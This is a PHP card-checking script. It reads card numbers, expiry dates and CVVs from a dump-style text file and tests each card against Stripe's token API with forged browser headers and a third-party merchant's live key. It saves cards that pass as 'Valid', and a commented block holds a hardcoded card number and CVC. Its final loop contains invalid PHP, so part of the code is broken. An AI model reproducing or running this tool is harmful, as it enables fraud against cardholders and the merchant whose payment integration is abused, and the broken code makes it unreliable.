<?php

error_reporting(0);
function postKartu($dataCard){
        $cardNumber = $dataCard['cardNumber'];
        $cardCVC = $dataCard['cardCVC'];
        $arrayDate = explode("/",$dataCard['cardExpired']);
        $month = $arrayDate[0];
        $year = $arrayDate[1];
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://js.stripe.com',
            'Referer: https://js.stripe.com/v3/controller-b7d81dedeec3c3d419eaeb8fd94a299b.html',
            ));
        curl_setopt($curl,CURLOPT_URL, "https://api.stripe.com/v1/tokens");

        curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36");

        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS,"card[number]=$cardNumber&card[cvc]=$cardCVC&card[exp_month]=$month&card[exp_year]=$year&guid=2dcd7151-862b-4a71-9121-e8d98a52fc99&muid=fd18d74e-5e1b-4308-b5a4-b1d14d040224&sid=70512436-7714-4c71-a65f-d6949f89d54b&key=pk_live_pKUQzNAmMFumQBqzbE4xxQCy&pasted_fields=number&payment_user_agent=stripe.js%2F51cf2b85%3B+stripe-js-v3%2F51cf2b85&referrer=https://www.mullvad.net/en/account/stripe");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($curl);
        return $result;
}

function dropTrashString($string){
  $string = str_replace(" ","",$string);
  $string = str_replace(" ","",$string);
  return $string;
}

		$file = "sampe.txt";
		$f = fopen($file, "r");
		$start = false;
		while ($line = fgets($f, 1000)) {
		  $arrayLine = explode(' : ', $line);
		  $lineParams = $arrayLine[0];
		  $lineValue = str_replace("\n","",$arrayLine[1]);
		  $lineValue = str_replace("\r","",$lineValue);
		  if(dropTrashString($lineParams) == "#Cardnumber")$cardNumber = dropTrashString($lineValue);
      echo $cardNumber."\n";
		  if(dropTrashString($lineParams) == "#Expiration")$cardExpired = dropTrashString($lineValue);
		  if(dropTrashString($lineParams) == "#CVV/CVV2")$cardCVC = dropTrashString($lineValue);
		}

  $arrayKartu = array(
    "cardNumber" => $cardNumber,
    "cardCVC" => $cardCVC,
    "cardExpired" => $cardExpired
  );
  // $arrayKartu = array(
  //   "cardNumber" => "4833160127628169",
  //   "cardCVC" => "703",
  //   "cardExpired" => "03/19",
  // );
  $response =postKartu($arrayKartu);
  $decodeResponse = json_decode($response);
  if($decodeResponse->card->cvc_check == "unavailable"){
    file_put_contents($arrayKartu['cardNumber'].".txt",json_encode($arrayKartu));
    echo "Valid ".$arrayKartu['cardNumber']."  \n";
  }else{
    echo "Invalid ".$arrayKartu['cardNumber']." \n";
  }
  // echo $response."\n";
  for ($x = 0; $x <= 10; $x++) {
    php valid.php;
} 
 ?>